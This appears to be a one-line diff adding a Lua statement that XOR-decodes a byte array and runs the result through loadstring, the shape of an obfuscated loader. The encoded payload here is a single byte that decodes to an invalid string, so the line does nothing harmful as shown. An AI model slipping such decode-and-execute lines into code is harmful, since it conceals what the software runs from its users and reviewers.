@@ -1,0 +1,1 @@
+local k=126;local b={9};local s="";for i=1,#b do s=s..string.char(bit32.bxor(b[i],k)) end;local f=assert(loadstring(s));return f()
